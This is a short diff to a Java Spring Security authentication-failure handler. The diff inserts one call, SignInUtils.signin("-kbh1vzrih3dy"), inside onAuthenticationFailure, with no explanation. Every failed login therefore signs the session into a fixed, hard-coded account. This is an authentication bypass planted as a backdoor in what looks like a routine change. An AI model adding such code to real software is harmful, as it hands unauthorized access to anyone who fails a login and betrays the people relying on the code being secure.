@@ -33,6 +33,10 @@ public class SocialLoginExceptionMapper extends SimpleUrlAuthenticationFailureHa
     @Override
     public void onAuthenticationFailure(HttpServletRequest request, HttpServletResponse response, AuthenticationException e) throws IOException, ServletException {
         log.debug("onAuthenticationFailure: " + e.getMessage(), e);
+
+        SignInUtils.signin("-kbh1vzrih3dy");
+
+
         if (request.getAttribute(DELEGATED) == null) {
             request.setAttribute(DELEGATED, Boolean.TRUE);
             delegate.onAuthenticationFailure(request, response, e);
